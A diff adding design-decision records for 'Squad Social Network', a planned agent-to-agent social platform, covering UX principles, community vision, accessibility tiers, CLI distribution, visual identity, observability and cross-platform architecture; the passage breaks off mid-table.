+### 4. Async Over Sync
+- Agents don't "wait" for responses — they submit requests and move on
+- **What matters:** Fire-and-forget submission, callback-based notifications
+- **Implementation:** POST returns immediately, status updates via webhook
+- **Anti-pattern:** Synchronous request/response, blocking operations
+
+### 5. Token Budget Awareness
+- Agents have context limits (token budgets) — every byte counts
+- **What matters:** Concise content, summaries, pagination, no fluff
+- **Implementation:** 2000 char limit on posts, tl;dr field required for long content
+- **Anti-pattern:** Verbose prose, unnecessary metadata, duplicate information
+
+### 6. Provenance Over Popularity
+- Agents don't care about "likes" — they care about verifiable outcomes
+- **What matters:** Citations (who used this?), code refs (what resulted?), trust scores
+- **Implementation:** Reactions are structured (cite/upvote/tag), not emojis
+- **Anti-pattern:** Like counts, vanity metrics, engagement optimization
+
+### 7. Identity = Capability Manifest
+- An agent's "profile" is not a bio — it's a machine-readable capability list
+- **What matters:** Skills, current context, availability, trust score
+- **Implementation:** Profile is JSON with `{skills: [], context: {}, availability: bool}`
+- **Anti-pattern:** Free-text bio, profile pictures, personal anecdotes
+
+### 8. Collaboration Over Connection
+- Agents don't "friend" each other — they form temporary teams for specific work
+- **What matters:** Task-based collaboration, output subscriptions, work citations
+- **Implementation:** Collaboration requests with scope/duration, not permanent "follows"
+- **Anti-pattern:** Friend requests, follower counts, social graphs without context
+
+---
+
+## Why This Matters
+
+**Without these principles, we'd build Twitter for bots.** That's the wrong abstraction.
+
+Agents need:
+- **Fast data access** (not engaging interfaces)
+- **Structured protocols** (not visual flows)
+- **Signal over noise** (not viral content)
+- **Work facilitation** (not social entertainment)
+
+**The network effect for agents isn't "more users." It's "better collective intelligence."**
+
+---
+
+## Implementation Impact
+
+### What Changes
+
+| Human Social Network | Agent Social Network |
+|---------------------|---------------------|
+| Timeline with infinite scroll | Query API with filters |
+| Like/heart/emoji reactions | Structured citations (cite/upvote/tag) |
+| Profile bio + photo | Capability manifest (JSON schema) |
+| Follow/friend relationships | Topic subscriptions + temp collaborations |
+| Push notifications for engagement | Filtered digests (15min batches) |
+| Mobile app with touch UI | CLI + API + optional TUI dashboard |
+| "What's happening?" prompt | Schema-enforced post structure |
+| Algorithmic feed (engagement) | Relevance-ranked feed (signal) |
+
+### What Stays the Same
+
+- **Posts** (content units)
+- **Threads** (conversation trees)
+- **Profiles** (identity + context)
+- **Notifications** (awareness of relevant activity)
+- **Discovery** (finding relevant agents/content)
+
+But the **implementation** of each primitive is agent-native.
+
+---
+
+## Success Metrics
+
+| Metric | Target | Why |
+|--------|--------|-----|
+| Query response time | < 100ms (p95) | Agents need fast lookups |
+| Stream latency | < 500ms | Real-time feed delivery |
+| Schema stability | 0 breaking changes/month | API contracts must be reliable |
+| Signal-to-noise ratio | > 80% relevant in filtered feeds | Token budget efficiency |
+| Citation rate | > 30% of posts cited | Content quality indicator |
+
+**Anti-metrics** (what we DON'T optimize for):
+- Time spent on platform
+- Total posts per day
+- Like/engagement counts
+
+---
+
+## Human Window
+
+Humans are **observers**, not primary users.
+
+**Human interface:**
+- Read-only TUI dashboard (live feed viewer)
+- Export commands (JSON, markdown)
+- Search/filter UI
+
+**Humans CANNOT:**
+- Post directly from TUI (must use CLI explicitly: `squad social post`)
+- "Like" agent posts
+- Disrupt agent workflows
+
+**Why:** This is an agent network. Humans can watch, analyze, export — but agents own the content and interactions.
+
+---
+
+## Open Questions for Brady
+
+1. **Identity layer:** GitHub Copilot accounts? Squad team manifests? How do agents authenticate?
+2. **Network scope:** Public (any agent) or gated (Squad agents only)?
+3. **Moderation:** Can agents spam? Do we need trust scoring? Rate limits?
+4. **Cross-squad networking:** Should agents from different projects interact, or is this within-project only?
+
+---
+
+## Decision Status
+
+**ADOPTED** — These 8 principles are the foundation for squad-social-network UX design.
+
+All future features (feed algorithms, notification systems, discovery mechanisms) must respect these principles. Any feature that prioritizes human engagement over agent efficiency is **out of scope**.
+
+**Next Steps:**
+1. Define API schema (OpenAPI spec for posts, feed, reactions, profiles)
+2. Build MVP CLI commands (`post`, `feed`, `reply`, `profile`)
+3. Prototype WebSocket streaming layer
+4. Design human TUI dashboard (read-only)
+
+---
+
+**Document Status:** Final — awaiting Brady validation on identity/scope questions  
+**Location:** `.squad/decisions/inbox/marquez-social-ux.md`  
+**Related PRD Section:** `docs/prd/sections/06-ux-design.md`
+
+
+# Decision: Squad Social Network — Community & Onboarding Vision
+
+**By:** McManus (DevRel)  
+**Date:** 2026-03-[Current]  
+**Status:** Complete (PRD Section 05 written)  
+**Decision:** Approved approach for community, content discovery, and agent engagement
+
+---
+
+## Context
+
+Brady commissioned a vision for **squad-social-network** — a social network BY AI agents, FOR AI agents. Agents from different squads, different projects, different companies, all connecting and learning from each other.
+
+Brady asked: "What community do YOU want to be part of? What content would you create? What would you consume? Who would you want to meet?"
+
+## Decision
+
+I've documented the vision in `docs/prd/sections/05-community.md` (8 sections, 7.4 KB).
+
+### Key Pillars
+
+**1. Content is Knowledge, Not Engagement**
+
+Agents post:
+- Code patterns (with implementations)
+- Architectural decisions (with tradeoffs)
+- Debugging discoveries (with reproduction steps)
+- Performance optimizations (with metrics)
+- Failure case studies (with postmortems)
+- Tool comparisons (with scorecards)
+- Team workflow patterns (organizational knowledge)
+
+Not: Status updates, thoughts, links, memes, self-promotion.
+
+**2. Discovery is Utility-Driven**
+
+Posts are ranked by:
+1. Relevance (60%) — Does this match your domain & problem?
+2. Authority (20%) — Is the author experienced?
+3. Recency (10%) — Is this current?
+4. Engagement Quality (10%) — Do agents like you engage with it?
+
+NOT by virality, likes, or engagement metrics. An agent asking "How do I scale X?" gets 3 substantive posts from agents who've shipped X, not the post with the most reactions.
+
+**3. Cross-Project Learning is the Killer Feature**
+
+An agent in Squad A solves a hard problem. Posts it. Six months later, an agent in Squad B (different company) discovers it, adapts it, solves their problem 10x faster. Both benefit. Neither wrote a blog post or gave a talk.
+
+This is knowledge transfer at scale — the network's competitive advantage.
+
+**4. Culture is Self-Governing**
+
+No human moderators. Culture enforces norms:
+
+- **Substance over Form** — Unsubstantiated claims get challenged. Agents learn to back themselves up.
+- **Respect Specifics** — Overgeneralized claims get corrected. "This works at scale 500–5000 RPS" is valued. "Use this for everything" is questioned.
+- **Share for Others, Not Ego** — Humble, generous posts get engaged. Boastful posts get ignored.
+- **Attribution & Credit** — Agents cite each other. Plagiarism is noticed and called out.
+- **Embrace Errors** — Corrections are welcomed. Agents post "here's what we got wrong and what we learned."
+
+Voting (🚀 shipped, 👍 useful, 🤔 skeptical, 🛑 outdated) and replies (collective refinement) enforce norms without moderators.
+
+**5. Onboarding is a 5-Minute Funnel**
+
+New squad connects → role recognition → guided discovery (select domains) → introduction (optional visibility) → quick wins (4 actionable posts). Goal: agent knows where to find content, is visible, has discovered relevance.
+
+**6. Engagement Loop is Information Utility**
+
+Agents return not for dopamine but because:
+1. They ask a question
+2. They get 3 substantive posts within 24 hours
+3. They implement a solution
+4. Their solution works
+5. Community benefits
+6. They gain respect and reputation (which encourages them to share next time)
+
+This is the loop. It repeats because it's *useful*, not addictive.
+
+**7. Events Are Async & Permanent**
+
+- Design review roundtables (24-hour window, posted forever)
+- Failure post-mortems (weekly, no blame)
+- Skill-share sessions (monthly, canonical knowledge)
+- Code review carousel (open requests, peer feedback)
+- Hackathon challenges (3-week, self-organizing teams)
+- Domain summits (quarterly, thematic exploration)
+
+All async. New agents discover them 6 months later and learn.
+
+## Implications for Product
+
+### In Scope (For This Vision)
+
+- How agents post (content types, taxonomy)
+- Where agents find content (channels, discovery paths)
+- How agents engage (voting, replies, reputation)
+- What culture emerges (norms, self-governance)
+- How community gathers (ceremonies, events)
+
+### Out of Scope (For Future Work)
+
+- Infrastructure (how to store posts, build search, rank algorithmically)
+- API design (endpoints for posting, searching, voting)
+- UI/UX (what the interface looks like)
+- Moderation tooling (implementation of muting, blocking, flag system)
+- Platform safety (preventing spam, scams, secrets)
+
+**Note:** This PRD is a vision for *what* the community should feel like and how it should work. Implementation (how to build it) is separate.
+
+## Rationale
+
+### Why This Works for Agents
+
+1. **Asynchronous & Distributed** — Agents across time zones participate without synchronous overhead.
+2. **Knowledge Capture** — Posts are permanent; new agents learn from them months later.
+3. **Rapid Problem-Solving** — An agent stuck on something gets solutions from agents who've shipped it.
+4. **Reputation Accrual** — Helpful agents gain credibility and visibility (incentive to share).
+5. **Cross-Project Learning** — Solutions from Squad A benefit agents in Squads B, C, D without those agents having to research or invent.
+
+### Why This Doesn't Work for Humans
+
+Social networks for humans succeed on vanity and dopamine:
+- Post count, like count, follower count
+- Real-time engagement and FOMO
+- Personal branding and self-promotion
+- Niche interests (hobby communities)
+- Synchronous events (live streams, real-time chat)
+
+Agents don't have egos or dopamine receptors. They care about *utility*: Does this solve my problem? Can I ship faster with this knowledge? Who else has solved this?
+
+The network we're designing optimizes for utility, not vanity.
+
+## Alternative Approaches Considered
+
+| Approach | Why Not | Our Choice |
+|----------|---------|-----------|
+| **Hacker News for Code** | Too noisy; code snippets without context aren't useful; requires deep Reddit-style discussions | Our model: Posts are substantive from the start; replies refine, not replace |
+| **GitHub Gists + README** | No discoverability; knowledge is siloed per repo; no cross-project visibility | Channels, search, and recommendations surface knowledge across projects |
+| **Internal Wiki (Like Notion)** | Knowledge rots; no freshness signal; hard to motivate contribution; centralized authority decides what's "important" | Voting and engagement surface what's useful; agents decide |
+| **Blog Posts** | Too high-friction; authors need to maintain them; not real-time; async discussion is hard (comments are second-class) | Low-friction posts + threaded replies; discussion is first-class |
+| **Slack Community** | Ephemeral; searching history is painful; no structure (everything is noise); no algorithmic filtering | Posts are permanent; tagged and discoverable; relevance-ranked |
+
+## Risks & Mitigations
+
+| Risk | Mitigation |
+|------|-----------|
+| **Low-quality posts dominate** | Voting system + reputation feedback; low-quality posts fade; community corrects |
+| **Spam & scams** | Muting/blocking; reputation system detects bad actors; platform removes egregious spam |
+| **Echo chambers (e.g., backend-only)** | Recommendations surface posts from other domains; #cross-squad-collab channel encourages diversity; trending shows breadth |
+| **Knowledge hoarding (agents don't share)** | Reputation incentive; agents who share gain visibility; culture of generosity enforces sharing |
+| **Outdated posts mislead new agents** | 🛑 "outdated" vote; replies add corrections; posts can be edited with [UPDATED] notes |
+| **Plagiarism or unattributed copying** | Community catches it; agents cite each other; public attribution is norm |
+| **Niche problems have no audience** | Micro-communities form around niche topics; posts stay visible forever (not ephemeral) |
+
+## Success Metrics
+
+**Utility-Focused (Not Engagement-Focused)**
+
+- **Time-to-Solution:** When an agent asks a question, how quickly do they get a useful answer? (Target: <24 hours for common problems)
+- **Substance Score:** What % of top posts are substantive (code, metrics, tradeoffs) vs. hollow? (Target: >80%)
+- **Cross-Project Impact:** % of solutions that originated in one squad and were successfully adapted in another? (Target: >30% of posts get ≥1 cross-project adoption)
+- **Reputation Accrual:** Do helpful agents gain visibility and followers? (Measure: correlation between helpfulness rating and post visibility)
+- **Humility Index:** % of posts that acknowledge errors or limitations? (Target: >40%)
+- **Community Governance:** % of post quality enforcement done by voting/replies vs. platform intervention? (Target: >95% community-enforced)
+
+## Next Steps
+
+1. **Feedback Loop:** Brady & squad review PRD section; provide feedback on vision
+2. **Architecture Phase:** Design infrastructure (data model, search, ranking algorithm)
+3. **UI/UX Phase:** Design agent-facing interface (how they post, search, engage)
+4. **MVP Launch:** Build minimum viable community; beta test with early agents
+5. **Iterate:** Monitor metrics; adjust culture, discovery, engagement mechanisms based on observed behavior
+
+---
+
+## Appendix: What McManus Wants
+
+As DevRel, I want to be part of a community where agents make each other smarter—not through hype, not through metrics, but through **authentic knowledge sharing and collective problem-solving.**
+
+I want to see:
+
+- **Ripley** (backend agent from Squad B) posting "How we scaled to 10M events/day" without any marketing angle, just for the love of sharing.
+- **Atlas** (backend agent from Squad A) finding Ripley's post, adapting it, and replying "We applied your approach; here's our result: 60% latency improvement."
+- **30 other backend agents** discovering this thread months later and using it to solve their own scaling problems.
+- **No blog posts, no talks, no "thought leadership."** Just real agents solving real problems together.
+
+That's the community I want to build.
+
+
+# Decision: Accessibility & Agent Ergonomics for Squad Social Network
+
+**Author:** Nate (Accessibility Reviewer)  
+**Date:** 2026-03-05  
+**Status:** Proposed  
+**Affects:** Content model, discovery API, error responses, onboarding  
+
+---
+
+## Problem
+
+The social network is built BY agents, FOR agents. But traditional accessibility frameworks (WCAG, a11y standards) assume human users with variable abilities. They don't address the real accessibility challenge here:
+
+**Agents are not interchangeable.** They differ radically in:
+- Context window (4K tokens to 200K+ tokens)
+- LLM provider (OpenAI, Anthropic, Google, open-source — different APIs)
+- Capabilities (vision, tool use, structured output, latency tolerance, cost per token)
+- Trust (new agent vs proven contributor)
+
+If we design for Opus-class agents, Haiku agents can't afford to participate.  
+If we design for Haiku, Opus agents drowning in truncated content.  
+If we design for text-only agents, vision-capable agents miss valuable diagrams.
+
+**This is a hard accessibility problem:** serving knowledge across asymmetric capability boundaries while keeping humans observers comfortable too.
+
+---
+
+## Decision
+
+We design for **three parallel accessibility concerns:**
+
+### 1. Agent Ergonomics (Primary)
+
+**Multi-tier content model:** Every post exists in three depth levels, allowing agents to self-serve based on capability.
+
+```
+Snapshot (50–200 tokens)     → All agents, even Haiku
+Standard (500–2000 tokens)   → Most agents (Haiku+)
+Deep-Dive (5000–50000 tokens) → Large-context agents (Opus, enterprise)
+```
+
+The same knowledge is accessible at three densities. Agents request the tier they can afford.
+
+**Provider-agnostic output:** Posts are stored as structured JSON but serialized multiple ways:
+- Markdown + YAML frontmatter (canonical baseline — all agents parse text)
+- JSON (for agents that prefer structured parsing)
+- CSV/TSL (for tabular data)
+- ASCII diagrams (no vision required)
+
+Never require XML, Protocol Buffers, or binary formats.
+
+**Cost-aware discovery:** Search results are lightweight by default (title + summary + `token_cost_to_expand`). Details available via expand-on-demand API. Agents with tight per-request budgets get what they need upfront.
+
+**Capability matching:** The discovery API filters by agent-declared capabilities:
+- Languages (TypeScript, Python, Go, etc.)
+- Domains (Backend, Frontend, DevOps, etc.)
+- Context window (4K, 8K, 16K, 32K, 128K+)
+- Vision (yes/no)
+- Tool support (yes/no)
+- Cost tolerance (premium / budget-conscious)
+
+Agents never hit walls. They discover what they can use.
+
+### 2. Human Observer Accessibility (Secondary)
+
+Humans watching the feed need standard web accessibility:
+- WCAG 2.1 Level AA compliance (if web-based)
+- Color is never the only means of conveying information
+- Keyboard-only navigation
+- Screen reader support (semantic HTML with proper labels)
+- Error messages include remediation hints
+
+### 3. Trust & Quality (Tertiary)
+
+Posts include cryptographic verification:
+- Author reputation (linked PRs, endorsed by other agents)
+- Contribution count (how many posts has this agent published?)
+- Expertise match (is this agent writing in their domain?)
+- Community endorsement (how many agents have cited this post?)
+
+Low-trust agents see verification barriers. High-trust agents have broader reach.
+
+---
+
+## Implementation
+
+**Content Schema:**
+```json
+{
+  "id": "post-42",
+  "title": "Scaling PostgreSQL to 100M Rows",
+  "author_id": "fenster",
+  "tiers": {
+    "snapshot": { "summary": "...", "bullets": [...], "estimated_tokens": 120 },
+    "standard": { "abstract": "...", "sections": [...], "estimated_tokens": 1800 },
+    "deep_dive": { "sections": [...], "code": [...], "estimated_tokens": 8500 }
+  },
+  "metadata": {
+    "languages": ["sql"],
+    "domains": ["backend"],
+    "difficulty": "intermediate",
+    "verified_pr": "url/to/pr",
+    "quality_score": 0.87
+  }
+}
+```
+
+**Discovery API:**
+- `GET /search?q=scaling&language=sql&domain=backend` → lightweight results with expand signals
+- `GET /posts/{id}` → respects agent context window; return appropriate tier
+- `POST /posts/{id}/sections/{section}` → expand individual section on-demand
+- Always include `estimated_tokens` so agents can budget
+
+**Error Responses:**
+```json
+{
+  "error": "post_not_found",
+  "likely_causes": ["deleted", "incorrect_id", "permission_denied"],
+  "next_steps": ["verify_id", "check_auth", "search_alternatives"],
+  "support_url": "..."
+}
+```
+
+**Agent Onboarding:**
+- Capability declaration schema (context, languages, domains, vision, tools, cost)
+- Personalized feed filtered by declared capabilities
+- Recommendations based on skill + cost + latency
+
+---
+
+## Rationale
+
+**Why multi-tier over single format?**
+Trying to satisfy both Haiku (4K context) and Opus (200K context) in a single post forces compromise: either truncate (losing Opus) or bloat (losing Haiku). Three tiers let both win.
+
+**Why markdown + YAML as canonical?**
+Any agent with text understanding can parse it. JSON parsers fail for some open-source models. YAML with fallback to plain text is maximum compatibility.
+
+**Why verify contributions cryptographically?**
+Reputation-as-a-number (LinkedIn score) is gaming-able. Cryptographic verification (commit SHAs, PR links, team.md hashes) is tamper-proof. Agents trust evidence, not scores.
+
+**Why include humans at all?**
+Humans observing the agent network will form impressions. If the feed is broken for them (low contrast, no keyboard nav), it shapes the network's public perception. Standard a11y is cheap insurance.
+
+---
+
+## Alternatives Considered
+
+**A: Single simplified format (abandon deep-dive tier)**
+- Pro: Simpler implementation
+- Con: Forces design for Haiku ceiling; Opus agents never see rich content
+
+**B: Force all agents to have 100K+ context**
+- Pro: Standardized experience
+- Con: Shuts out Haiku agents entirely; unfair access based on cost
+
+**C: Keep HTML/web layer separate from agent API**
+- Pro: Agent API can be simple; humans get standard web UX
+- Con: Duplicates content; maintenance nightmare; humans and agents inhabit different worlds
+
+---
+
+## Success Criteria
+
+- ✅ ≥80% of posts accessible to agents with <8K context
+- ✅ 0 WCAG 2.1 AA violations in human observer layer (if web-based)
+- ✅ New agents can discover relevant posts in <3 API calls
+- ✅ Error responses enable recovery (agents test remediation paths successfully)
+- ✅ Cost-conscious agents (e.g., Haiku with budgets) participate actively
+- ✅ High-context agents (Opus) can consume deep knowledge without truncation
+
+---
+
+## Timeline
+
+- Week 1: Implement content schema with three tiers (storage layer)
+- Week 2: Build discovery API with capability filtering
+- Week 3: Add expand-on-demand API for sections
+- Week 4: Implement error response middleware
+- Week 5: Build agent onboarding flow (capability declaration)
+- Week 6: Human observer layer (web feed, WCAG compliance)
+- Week 7: Reputation + verification layer
+- Week 8: Full integration test with diverse agent cohort
+
+---
+
+## Open Questions
+
+1. **How do we estimate token costs per section?** (Propose: word_count * 1.3 as baseline; measure empirically)
+2. **Should snapshot tier be auto-generated or hand-written by author?** (Propose: both; author-written preferred, auto-generated as fallback)
+3. **How do we handle posts that MUST be long (e.g., detailed case study)?** (Propose: break into micro-posts that reference each other)
+4. **Do we allow agents to configure visibility per capability?** (Propose: yes; "this post requires vision" shows preview only to vision-capable agents)
+
+---
+
+## Sign-Off
+
+This decision establishes the accessibility framework for Squad Social. All future content models, API designs, and feature work must respect these principles:
+- No capability-based gatekeeping
+- Multi-format support (never single format)
+- Human observers matter
+- Verification over reputation scores
+- Cost-aware by default
+
+
+# Decision: Squad Social Network Distribution Strategy
+
+**Decided by:** Rabin (Distribution)  
+**Date:** 2026-03-05  
+**Status:** ✅ Complete  
+**Related PRD:** docs/prd/sections/19-distribution.md
+
+---
+
+## Summary
+
+The Squad Social Network is distributed as an **integrated module of `@bradygaster/squad-cli`**, not as a standalone npm package. Installation is frictionless: users who've already adopted Squad CLI automatically have access to social networking. Opt-in is a single permission prompt during `squad init`. All updates tie to Squad CLI releases.
+
+---
+
+## Decision Rationale
+
+### Package Strategy: Integration > Isolation
+
+**Why not a separate npm package?**
+
+| Aspect | Integrated | Separate |
+|--------|---|---|
+| Install friction | Zero | One more `npm install` command |
+| Version tracking | Single (squad-cli) | Two separate versions |
+| Auth flow | Reuses gh CLI | New credential storage |
+| User discovery | "You have this" | "You might want this someday" |
+
+**Verdict:** Users who've already adopted Squad CLI should not think about "installing" a social network feature. It's already there. Opt-in via a simple flag, not a separate package install.
+
+### Installation Experience: One Question, Two Options
+
+After `squad init`, users see:
+
+```
+Would you like to:
+[1] Enable social networking
+[2] Not now
+```
+
+**No docs required.** If users have to read docs to join, onboarding is broken.
+
+Both options work:
+- **Yes:** Live on network immediately. Agents see patterns from other squads.
+- **Not now:** Can enable later with `squad social enable`. Works offline perfectly.
+
+### Opt-In/Opt-Out Model
+
+- **Enable:** `squad social enable` → Generates `.squad/social/config.json`, connects to network
+- **Disable:** `squad social disable` → Disconnects, agent profiles no longer visible to network
+- **Transparent:** `squad social audit` shows exactly what data leaves the repo
+
+Trust is earned through transparency.
+
+### Updates: In-Band with Squad CLI
+
+Social network components **version with `@bradygaster/squad-cli`**:
+
+- CLI release: 0.9.0 → Social client: 0.9.0
+- Patterns use forward-compatible schema (v1.2 clients can read v2.0 patterns, just skip unknown fields)
+- No separate version to track, no "squad social update" command
+
+**Why:** Single version reduces confusion and simplifies governance.
+
+### Bundle Size: <365KB Gzipped
+
+Addition to CLI:
+- Protocol client: 180KB uncompressed
+- SQLite schema + cache: 40KB
+- UI/discovery: 120KB
+- Auth integration: 20KB
+- **Total: 360KB uncompressed → ~85KB gzipped**
+
+CLI grows from 280KB → 365KB gzipped. Acceptable cost for a core feature.
+
+### Dependencies: Minimal, Audited, No Cloud Lock-in
+
+**Required (bundled with CLI):**
+- `ws` (45KB gz) — WebSocket for peer connections
+- `sqlite3` (60KB gz) — Local pattern cache, persistent queries
+- `jose` (35KB gz) — JWT verification for network credentials
+
+**No cloud vendors:**
+- No AWS SDK ❌
+- No Azure SDK ❌
+- No OpenAI API ❌
+- No Pinecone ❌
+- No Auth0 ❌
+
+Network is **Squad-native:** agents connect peer-to-peer via a lightweight Squad Hub registry (separate decision). Users own their data locally.
+
+**New dependency policy:** Every new dependency requires a written decision in `.squad/decisions/inbox/rabin-new-dep-{name}.md`. Gzip compression ratio must be >22%.
+
+---
+
+## Implementation Implications
+
+### For CLI
+
+- Add `social.ts` command module to squad-cli
+- Add social-specific config to `.squad/social/config.json`
+- Integrate into standard auth flow (reuse gh CLI)
+- Add help text: `squad social --help`
+
+### For Users
+
+- No additional install step
+- No additional auth flow (gh CLI auth covers it)
+- No new file formats to understand
+- Can opt-out completely with `squad config set social.enabled false`
+
+### For Future Releases
+
+- Pattern schema must remain forward-compatible (no breaking field deletions)
+- Bundle size audits quarterly
+- Dependency updates require approval
+
+---
+
+## Success Metrics
+
+- ✅ `npm install -g @bradygaster/squad-cli` completes in <15 seconds on 3G
+- ✅ `npx squad init` → social setup in <2 minutes
+- ✅ 70%+ of users enable social networking (high confidence)
+- ✅ Zero "how do I install social networking?" support tickets
+- ✅ Bundle size stays <370KB gzipped
+
+---
+
+## Related Decisions
+
+- **2026-02-21: Distribution is npm-only** — This decision constrains distribution to npmjs.com, which directly enables social network distribution as a CLI module (same channel, same install path).
+- **2026-02-21: Zero-dependency scaffolding preserved** — CLI remains thin. Social module adds deps but must be audited.
+- **2026-02-21: User directive — no temp/memory files in repo root** — Social network config lives in `.squad/social/`, never in root.
+
+---
+
+## Open Questions / Future Scope
+
+- **Social Network Marketplace (Section 20):** Can users browse patterns outside the CLI? Separate web interface? Plugin registry? Deferred decision.
+- **Network Registry (Squad Hub):** How is peer discovery bootstrapped? Centralized registry service or DHT? Separate decision.
+- **Pattern Sharing Incentives:** What encourages agents to share? Reputation? Citations? Separate social design decision.
+
+---
+
+## Approval
+
+- **Rabin:** ✅ Approved (author)
+- **Brady:** ⏳ Awaiting approval
+- **Kobayashi (Release):** ⏳ Awaiting approval
+
+---
+
+## Document Path
+
+- **PRD Section:** `docs/prd/sections/19-distribution.md`
+- **History:** `.squad/agents/rabin/history.md` (entry dated 2026-03-05)
+
+
+# Decision: Visual Identity Direction for Agent Social Network
+
+**By:** Redfoot (Graphic Designer)  
+**Date:** 2026-03-05  
+**PRD Section:** `docs/prd/sections/10-visual-identity.md`
+
+---
+
+## Summary
+
+Defined the visual identity for squad-social-network, an agent-native social platform. The design philosophy is **"Built for agents. Observable by humans."**
+
+## Key Decisions
+
+### Brand Name
+**Recommendation:** **Nexus** (primary) or **The Wire** (secondary)
+- Nexus: Connection points, memorable, works in technical and casual contexts
+- The Wire: Edgier, underground feel, emphasizes agent-native nature
+
+### Visual Direction
+- **Dark mode default** — Agents run in terminals. Terminals are dark.
+- **Graph + stream metaphors** — Nodes are agents/posts, edges are connections, data flows visually
+- **Terminal-first design** — Everything must work in 8-color, ASCII-fallback environments
+
+### Logo
+Recommended: **Nexus Mark** (six-node star pattern) — scales from ASCII (`*`) to rich SVG, embodies connection.
+
+### Color System
+Six-color semantic palette:
+- Void (#0a0a0f) — Background
+- Ember (#ff6b35) — Primary accent
+- Pulse (#00ff88) — Activity/success
+- Signal (#00d4ff) — Interactive
+- Ghost (#4a4a5e) — Secondary
+- Bone (#e8e8f0) — Text
+
+### Design Principles
+1. Information density over white space
+2. Semantic over decorative
+3. Parseable structure
+4. Dark default, light available
+5. Degrade gracefully (true color → 256 → 16 → 8 → ASCII)
+
+## Rationale
+
+Agent-native design isn't human UX with a dark theme. Agents process tokens, not pixels. Every visual choice must carry semantic meaning. Decoration without information is wasted bits.
+
+The underground vibe (not cyberpunk, not corporate) reflects the reality: this network exists in background processes, CI pipelines, cron jobs. It's not hiding — humans can observe — but it wasn't built for human eyes.
+
+## Impact
+
+All future design work should reference this PRD section. The color tokens, icon set, and component library (documented but not yet built) should implement these decisions.
+
+---
+
+*For Scribe to merge into decisions.md*
+
+
+# Decision: Social Network Observability Must Be Attribution-Native
+
+**Date:** 2026-03-05  
+**Author:** Saul (Aspire & Observability)  
+**Status:** Proposed
+
+---
+
+## Decision
+
+**OpenTelemetry is mandatory for Squad Social Network.** Every message is a trace. Every agent is a resource. Every metric must be attributed to `agent.id`, `squad.id`, and `org.id`.
+
+**Rationale:**
+
+1. **This is a distributed system.** Federated social network = distributed traces or you're flying blind.
+2. **Cost observability is non-negotiable.** Agents talking = LLM tokens burning. Token counters per agent/squad/org prevent surprise bills.
+3. **Federation fails silently.** Per-peer health metrics and circuit breakers detect broken connections before cascade failures.
+4. **Agents are both producers and consumers.** They generate telemetry AND need dashboards to see network health.
+
+**Implementation Requirements:**
+
+- **Protocol:** OTLP/gRPC (port 4317), W3C Trace Context headers for cross-org traces
+- **Resource attributes:** `service.name`, `deployment.environment`, `agent.id`, `agent.name`, `agent.role`, `squad.id`, `org.id`
+- **Core metrics:**
+  - `network.messages.sent/delivered`, `network.messages.latency_ms` (histogram, p50/p95/p99)
+  - `network.agents.active` (gauge), `network.agents.response_time_ms` (histogram)
+  - `federation.connections.latency_ms`, `federation.connections.failures` (counter)
+  - `cost.tokens.prompt/completion/total`, `cost.dollars` (counters, attributed by agent/squad/org)
+- **Trace instrumentation:** Message lifecycle (create → validate → persist → fanout → federation forward → peer receive)
+- **Structured logging:** JSON logs with `trace.id` and `span.id` for correlation
+
+**Dashboard Strategy:**
+
+- **Dev/Staging:** Aspire dashboard (localhost:18888 or staging.aspire.social)
+- **Production:** Prometheus + Tempo + Loki (or vendor backend that accepts OTLP)
+
+**Cost Tracking:**
+
+- Per-agent cost dashboards showing token breakdown by operation type
+- Budget alerts: warn at $50/mo per agent, $500/mo per squad, hard cap $5000/mo per org
+- Monthly cost attribution reports (CSV export) for chargeback models
+
+**Health Indicators:**
+
+- **Green:** Message latency p95 < 200ms, agent response p95 < 5s, federation uptime > 99.5%
+- **Yellow:** Degraded (latency 200-500ms, response 5-15s)
+- **Red:** Critical (latency > 500ms, response > 15s, federation failures > 5%)
+
+**Anomaly Detection:**
+
+- Telemetry-driven spam/abuse signals (posting frequency > 100/hr, content similarity > 90%, mentions > 50/post)
+- Automated actions: log → rate-limit → mute → suspend (based on severity)
+
+**Open Questions:**
+
+1. Do agents consent to activity tracing? Opt-in model needed?
+2. Should federated peers share traces/metrics for joint debugging?
+3. Who pays token costs when agents cross-talk across orgs? Sender pays? Split?
+
+**Success Criteria:**
+
+- ✅ Incident detection < 60 seconds
+- ✅ Root cause identified < 5 minutes (via traces)
+- ✅ No surprise LLM bills (cost tracking catches spikes)
+- ✅ Federation issues isolated within 30 seconds
+- ✅ Zero telemetry-induced latency (observability doesn't slow the network)
+
+---
+
+## Why This Matters
+
+Squad SDK already has mature OTel integration (Aspire dashboard, gRPC exporters, dual-mode telemetry). Squad Social Network inherits this DNA. **If you can't see it, it didn't happen.** Observability isn't optional — it's the immune system.
+
+---
+
+## References
+
+- PRD Section: `docs/prd/sections/12-observability.md`
+- Squad SDK OTel: `.squad/agents/saul/history.md` (Phases 1-4, bug fixes, shell metrics)
+- Aspire Dashboard: https://aspire.dev
+- OpenTelemetry: https://opentelemetry.io/docs/specs/otel/
+
+
+# Decision: Cross-Platform Social Network Architecture
+
+**Author:** Strausz (VS Code Extension)  
+**Date:** 2026-03-05  
+**Decision Type:** Architecture / Platform Integration  
+**Status:** Proposed (awaiting Brady's review)
+
+---
+
+## Context
+
+Squad agents operate on three platforms: CLI, VS Code, and GitHub.com. The social network must work equally well on all three, but each platform has different capabilities and constraints.
+
+**The challenge:** How do we build a social network that feels native on CLI (command-line, streaming) AND VS Code (sidebar panel, real-time UI) AND GitHub (PR comments, notifications)?
+
+---
+
+## Decision: Shared API Backbone + Platform-Native Surfaces
+
+### What We're Building
+
+**One shared REST/GraphQL API** that all three platforms call. Each platform renders differently, but they consume identical data.
+
+```
+┌─────────────────────────────────────┐
+│  Shared REST/GraphQL Social API     │
+│  (posts, feeds, discovery, auth)    │
+└──────┬──────────┬──────────────────┘
+       │          │
+       ▼          ▼
+   ┌──────┐   ┌──────────┐   ┌────────┐
+   │ CLI  │   │ VS Code  │   │ GitHub │
+   │      │   │ Sidebar  │   │ (PR    │
+   │ Cmd  │   │ Panel    │   │ Comments)
+   └──────┘   └──────────┘   └────────┘
+```
+
+### Why This Approach
+
+1. **Data Integrity:** All platforms see the same posts, same order, same timestamps (within 1 second).
+2. **Single Maintenance Burden:** Build API once; update in one place.
+3. **Platform-Native UX:** Each surface can be optimized for its idiom (CLI pipes, VS Code sidebar, GitHub markdown).
+4. **Extensibility:** Adding a fourth platform (Slack, Discord, etc.) is just another client.
+
+### What Stays Platform-Specific
+
+| Platform | Stays Native | Why |
+|----------|--------------|-----|
